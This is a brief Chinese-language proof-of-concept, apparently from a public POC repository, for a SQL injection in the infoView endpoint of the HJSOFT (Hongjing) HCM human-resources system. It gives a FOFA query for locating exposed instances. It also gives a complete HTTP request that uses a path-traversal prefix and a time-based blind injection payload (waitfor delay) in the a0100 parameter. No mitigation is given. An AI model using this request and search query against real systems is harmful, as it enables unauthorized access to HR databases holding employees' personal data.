## 宏景HCM系统infoView处存在sql注入漏洞

## fofa
```
app="HJSOFT-HCM"
```


## poc
```
GET /templates/attestation/../../general/info/view?kind=1&a0100=1';waitfor+delay+'0:0:3'+-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

![735e80af6f18b931778ed42001b7733e](https://github.com/wy876/POC/assets/139549762/6d8159a2-5884-4a1e-823a-e06705afb37e)
